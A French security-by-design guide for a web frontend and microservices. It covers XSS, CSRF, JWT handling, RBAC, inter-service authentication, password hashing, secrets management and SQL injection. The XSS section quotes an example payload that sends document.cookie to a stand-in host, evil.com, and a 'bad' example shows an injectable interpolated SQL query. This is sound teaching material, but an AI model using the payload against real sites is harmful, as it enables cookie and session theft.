# Sécurité par Design — Architecture Frontend + Microservices

> Ce document couvre les niveaux de sécurité à appliquer à chaque couche de votre architecture.
> La sécurité ne s'ajoute pas à la fin : elle se conçoit dès le départ.

---

## Vue d'ensemble des surfaces d'attaque

```
                        INTERNET (non fiable)
                               │
                    ┌──────────▼──────────┐
                    │      FRONTEND       │  ← Surface 1 : Client
                    │  (navigateur user)  │
                    └──────────┬──────────┘
                               │ HTTPS uniquement
                    ┌──────────▼──────────┐
                    │    API GATEWAY      │  ← Surface 2 : Point d'entrée
                    │  (reverse proxy)    │
                    └──────────┬──────────┘
                               │
              ┌────────────────┼────────────────┐
              │                │                │
   ┌──────────▼──────┐  ┌──────▼────────┐  ┌───▼──────────┐
   │   Service Auth  │  │  Service IA   │  │  Service X   │  ← Surface 3 : Services
   └──────────┬──────┘  └──────┬────────┘  └───┬──────────┘
              │                │                │
         ┌────┴────┐      ┌────┴────┐      ┌────┴────┐
         │   DB    │      │   DB    │      │   DB    │       ← Surface 4 : Données
         └─────────┘      └─────────┘      └─────────┘

   Chaque flèche = un vecteur d'attaque potentiel
```

---

## Principe fondamental : Defense in Depth

Ne jamais compter sur **une seule ligne de défense**. Chaque couche doit être sécurisée indépendamment comme si les couches précédentes avaient été compromises.

```
┌─────────────────────────────────────────────────────────┐
│  COUCHE 1 — Réseau       (HTTPS, firewall, rate limit)  │
│  ┌───────────────────────────────────────────────────┐  │
│  │  COUCHE 2 — Authentification      (JWT, OAuth2)   │  │
│  │  ┌─────────────────────────────────────────────┐  │  │
│  │  │  COUCHE 3 — Autorisation   (RBAC, scopes)   │  │  │
│  │  │  ┌──────────────────────────────────────────┐  │  │  
│  │  │  │  COUCHE 4 — Validation  (input sanitiz)│ │  │  │
│  │  │  │  ┌─────────────────────────────────┐   │ │  │  │
│  │  │  │  │  COUCHE 5 — Données  (encrypt)  │   │ │  │  │
│  │  │  │  └─────────────────────────────────┘   │ │  │  │
│  │  │  └────────────────────────────────────────┘ │  │  │
│  │  └─────────────────────────────────────────────┘  │  │
│  └───────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘
```

---

## Surface 1 — Sécurité du Frontend (navigateur)

### 1.1 Ne jamais stocker de secrets dans le navigateur

```
MAUVAIS ❌                          BON ✅
──────────────────────────          ──────────────────────────
localStorage.setItem(               Cookie HttpOnly + Secure
  'token', jwtToken                 (inaccessible via JS)
)
                                    ou

sessionStorage.setItem(             Token en mémoire (variable JS)
  'token', jwtToken                 perdu à la fermeture de l'onglet
)
```

| Stockage | Accessible via JS | Envoyé auto avec requêtes | Recommandé pour JWT |
|---|---|---|---|
| `localStorage` | Oui | Non | Non (XSS vulnérable) |
| `sessionStorage` | Oui | Non | Non (XSS vulnérable) |
| Cookie `HttpOnly` | **Non** | Oui (même domaine) | Oui (mais CSRF à gérer) |
| Mémoire JS | Oui | Non | Acceptable (perdu au refresh) |

### 1.2 Cross-Site Scripting (XSS)

Une faille XSS permet à un attaquant d'injecter du JavaScript malveillant dans votre page.

```
ATTAQUE XSS :
Utilisateur entre dans un champ : <script>fetch('evil.com?c='+document.cookie)</script>
Si affiché tel quel dans le HTML → le script s'exécute → vol de cookies/token

PROTECTION :
→ Toujours échapper les données avant affichage (les frameworks modernes le font par défaut)
→ React : JSX échappe automatiquement   {userInput}    ✅
→ Éviter :  dangerouslySetInnerHTML     ❌
→ Définir une Content Security Policy (CSP) dans les headers HTTP
```

**Header CSP (à configurer côté serveur) :**
```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
```

### 1.3 Cross-Site Request Forgery (CSRF)

```
ATTAQUE CSRF :
1. User connecté sur votre app (cookie de session actif)
2. User visite un site malveillant
3. Ce site envoie une requête à VOTRE API en utilisant le cookie existant
4. Votre API exécute l'action (transfert d'argent, suppression de compte...)

PROTECTION si vous utilisez des cookies :
→ Ajouter SameSite=Strict ou SameSite=Lax sur le cookie
→ Ou utiliser un CSRF token (double submit pattern)

Si vous utilisez JWT dans le header Authorization :
→ CSRF non applicable (le JS doit lire le token, un site tiers ne peut pas)
```

### 1.4 HTTPS obligatoire

```
JAMAIS en HTTP en production.
→ Toutes les communications doivent passer par HTTPS (TLS 1.2 minimum, TLS 1.3 idéal)
→ Utiliser HSTS pour forcer HTTPS même si l'user tape http://
```
```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

---

## Surface 2 — Sécurité de l'API Gateway

L'API Gateway est le **seul point d'entrée** vers vos services. C'est là que se concentre la première ligne de défense.

```
                    ┌─────────────────────────────────┐
Internet ──────────►│          API GATEWAY            │
                    │                                 │
                    │  1. Vérification JWT             │
                    │  2. Rate Limiting                │
                    │  3. Validation basique inputs    │
                    │  4. Logging des requêtes         │
                    │  5. Routing vers le bon service  │
                    │                                 │
                    └──────────────┬──────────────────┘
                                   │  Réseau interne sécurisé
                         ┌─────────┴──────────┐
                         │                    │
                    Service 1            Service 2
```

### 2.1 Rate Limiting

Limiter le nombre de requêtes par IP / par utilisateur pour éviter :
- Les attaques par force brute (tentatives de mot de passe)
- Les attaques DDoS
- Le scraping abusif

```python
# Exemple avec FastAPI + slowapi
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)

@app.post("/auth/login")
@limiter.limit("5/minute")  # max 5 tentatives de login par minute par IP
async def login(request: Request, credentials: LoginSchema):
    ...
```

### 2.2 Headers de sécurité

Configurer ces headers sur tous les endpoints :

```
X-Content-Type-Options: nosniff          # évite le MIME sniffing
X-Frame-Options: DENY                    # évite le clickjacking
X-XSS-Protection: 1; mode=block         # protection XSS navigateur
Referrer-Policy: strict-origin           # limite les infos de navigation
```

---

## Surface 3 — Authentification et Autorisation (JWT + RBAC)

### 3.1 Le flux JWT complet

```
LOGIN :
  Client ──── POST /auth/login {email, password} ────► Service Auth
              ◄─── { access_token, refresh_token } ────

REQUÊTE AUTHENTIFIÉE :
  Client ──── GET /api/resource
              Header: Authorization: Bearer <access_token> ────► API Gateway
                                                                      │
                                                            Vérifie signature JWT
                                                            Vérifie expiration
                                                                      │
                                                              ────► Service

REFRESH :
  Client ──── POST /auth/refresh { refresh_token } ────► Service Auth
              ◄─── { nouveau access_token } ────
```

### 3.2 Anatomie d'un JWT sécurisé

```
Header.Payload.Signature

Header  : { "alg": "HS256", "typ": "JWT" }
Payload : { "sub": "user_id_123",
            "role": "admin",
            "exp": 1700000000,   ← expiration (court : 15min à 1h)
            "iat": 1699996400 }
Signature : HMACSHA256(base64(header) + "." + base64(payload), SECRET_KEY)
```

**Règles JWT :**

```
SECRET_KEY     → Longue (256 bits min), aléatoire, jamais en dur dans le code
               → Stocker dans variable d'environnement (.env, vault)

access_token   → Durée de vie courte (15 min à 1h)
               → Contient le rôle et l'id utilisateur

refresh_token  → Durée de vie longue (7 à 30 jours)
               → Stocké en base, révocable
               → Renouvelé à chaque usage (rotation)

JAMAIS         → alg: "none"  (permet de forger n'importe quel token)
JAMAIS         → Stocker le mot de passe ou données sensibles dans le payload
               → Le payload JWT est encodé en base64, PAS chiffré → lisible par tous
```

### 3.3 Role-Based Access Control (RBAC)

La vérification du rôle doit se faire **dans chaque service**, pas seulement en gateway.

```python
# Hiérarchie des rôles
ROLES = {
    "super_admin": 4,
    "admin":       3,
    "manager":     2,
    "user":        1,
}

def require_role(minimum_role: str):
    def decorator(func):
        async def wrapper(current_user = Depends(get_current_user), ...):
            if ROLES[current_user.role] < ROLES[minimum_role]:
                raise HTTPException(status_code=403, detail="Accès refusé")
            return await func(current_user=current_user, ...)
        return wrapper
    return decorator

# Utilisation
@app.delete("/users/{user_id}")
@require_role("admin")        # seuls admin et super_admin peuvent supprimer
async def delete_user(user_id: str, current_user = Depends(get_current_user)):
    ...
```

### 3.4 Principe du moindre privilège

```
Chaque utilisateur ne doit avoir accès qu'au strict minimum nécessaire.

MAUVAIS ❌                              BON ✅
──────────────────────────────          ──────────────────────────
SELECT * FROM users                     SELECT id, name, email
WHERE id = ?                            FROM users
                                        WHERE id = ?  AND deleted_at IS NULL

Un "user" peut voir le profil           Un "user" peut voir UNIQUEMENT
de n'importe quel utilisateur           son propre profil
```

---

## Surface 4 — Sécurité inter-services

Dans une architecture microservices, les services communiquent entre eux. Cette communication doit aussi être sécurisée.

```
                    Réseau interne (non exposé à internet)
                               │
        ┌──────────────────────┼──────────────────────┐
        │                      │                      │
   Service Auth          Service IA            Service X
        │                      │
        └──── Appel interne ───►│
             Qui garantit que c'est bien Service Auth qui appelle ?
```

### Options pour sécuriser la communication inter-services

**Option A — API Key interne (simple, adapté au projet)**

```python
# Service IA expose un endpoint interne
INTERNAL_API_KEY = os.getenv("INTERNAL_API_KEY")  # clé partagée entre services

@app.post("/internal/analyze")
async def analyze(request: Request, data: AnalyzeSchema):
    api_key = request.headers.get("X-Internal-Key")
    if api_key != INTERNAL_API_KEY:
        raise HTTPException(status_code=403)
    ...

# Service Auth appelle Service IA
response = requests.post(
    "http://service-ia/internal/analyze",
    headers={"X-Internal-Key": INTERNAL_API_KEY},
    json={"text": document}
)
```

**Option B — mTLS (Mutual TLS) — production avancée**

Les deux services présentent un certificat. Chacun vérifie celui de l'autre. Adapté pour Kubernetes / production critique.

---

## Surface 5 — Sécurité des données

### 5.1 Mots de passe : ne jamais stocker en clair

```python
# MAUVAIS ❌
user.password = password  # stocké en clair en base

# BON ✅ — bcrypt avec salt automatique
from passlib.context import CryptContext

pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

def hash_password(plain_password: str) -> str:
    return pwd_context.hash(plain_password)  # salt inclus automatiquement

def verify_password(plain_password: str, hashed: str) -> bool:
    return pwd_context.verify(plain_password, hashed)
```

### 5.2 Variables d'environnement — jamais de secrets dans le code

```
MAUVAIS ❌                              BON ✅
──────────────────────────────          ──────────────────────────
SECRET_KEY = "mon_secret_123"           SECRET_KEY = os.getenv("SECRET_KEY")
DB_URL = "postgres://user:pass@..."     DB_URL = os.getenv("DATABASE_URL")

# Dans le code versionné                # Dans un fichier .env (non commité)
                                        # ou dans les secrets du CI/CD
```

**Fichier `.gitignore` obligatoire :**
```
.env
.env.local
.env.production
*.pem
*.key
secrets/
```

### 5.3 Injection SQL

```python
# MAUVAIS ❌ — injection SQL possible
query = f"SELECT * FROM users WHERE email = '{email}'"

# BON ✅ — requête paramétrée
query = "SELECT * FROM users WHERE email = $1"
result = await db.fetch(query, email)

# Avec un ORM (SQLAlchemy, Prisma, etc.) → protégé par défaut
user = db.query(User).filter(User.email == email).first()
```

### 5.4 Données sensibles dans les logs

```python
# MAUVAIS ❌
logger.info(f"Login attempt for {email} with password {password}")

# BON ✅
logger.info(f"Login attempt for user {user_id}")
# Ne jamais logger : mots de passe, tokens, numéros de carte, données personnelles
```

---

## Checklist de sécurité — par couche

### Frontend
- [ ] HTTPS uniquement (pas de HTTP en prod)
- [ ] JWT stocké en cookie `HttpOnly; Secure; SameSite=Strict` ou en mémoire
- [ ] Aucun secret (API key, mot de passe) dans le code frontend
- [ ] Données utilisateur échappées avant affichage (anti-XSS)
- [ ] Headers de sécurité configurés (CSP, X-Frame-Options...)

### API Gateway / Backend
- [ ] Rate limiting sur les endpoints sensibles (login, register)
- [ ] Validation et sanitisation de tous les inputs
- [ ] Authentification vérifiée avant tout traitement
- [ ] Logs sans données sensibles

### Authentification
- [ ] Mots de passe hashés avec bcrypt (ou argon2)
- [ ] JWT avec expiration courte pour l'access token
- [ ] Secret JWT dans une variable d'environnement
- [ ] `alg: "none"` rejeté explicitement
- [ ] Refresh token révocable (stocké en base)

### Autorisation
- [ ] Vérification du rôle dans chaque service (pas seulement en gateway)
- [ ] Un utilisateur ne peut accéder qu'à ses propres ressources
- [ ] Principe du moindre privilège appliqué

### Données
- [ ] Pas de secret dans le code versionné (`.env` dans `.gitignore`)
- [ ] Requêtes paramétrées (anti-injection SQL)
- [ ] Données sensibles non loguées
- [ ] `.env.example` fourni avec les clés (sans valeurs) pour la documentation

### Communication inter-services
- [ ] Services internes non exposés à internet
- [ ] Appels inter-services authentifiés (API Key interne minimum)

---

## Les 5 erreurs les plus fréquentes à éviter

```
1. COMMITER UN FICHIER .env
   → Même retiré ensuite, il reste dans l'historique Git
   → Utiliser : git rm --cached .env puis .gitignore

2. JWT SANS EXPIRATION
   → Un token volé reste valide à vie
   → Toujours définir "exp" dans le payload

3. FAIRE CONFIANCE AU FRONTEND
   → Le client peut envoyer n'importe quoi
   → Toujours revalider côté serveur

4. EXPOSER DES MESSAGES D'ERREUR TROP DÉTAILLÉS
   → "Email introuvable" vs "Mot de passe incorrect" → confirmation d'existence d'un compte
   → Retourner : "Identifiants invalides" dans les deux cas

5. OUBLIER LA VÉRIFICATION D'APPARTENANCE
   → GET /orders/456 → vérifier que la commande 456 appartient bien à l'utilisateur connecté
   → Sans ça : un user peut voir les données de n'importe quel autre user (IDOR)
```

---

## Schéma récapitulatif — flux sécurisé complet

```
Browser                API Gateway             Service Auth          Service IA
  │                        │                        │                    │
  │──POST /login ─────────►│                        │                    │
  │  {email, password}     │──vérif rate limit      │                    │
  │                        │──POST /auth/login ─────►│                    │
  │                        │                        │──hash & compare    │
  │                        │                        │──génère JWT        │
  │                        │◄─── {access, refresh} ─│                    │
  │◄── Cookie HttpOnly ────│                        │                    │
  │                        │                        │                    │
  │──GET /api/analyze ─────►│                        │                    │
  │  Cookie: token=...     │──vérifie JWT signature  │                    │
  │                        │──vérifie expiration     │                    │
  │                        │──extrait rôle           │                    │
  │                        │──POST /internal/analyze ├────────────────────►│
  │                        │  X-Internal-Key: ...   │                    │──traite
  │                        │                        │                    │
  │                        │◄──────── résultat ──────┼────────────────────│
  │◄── 200 {result} ───────│                        │                    │
```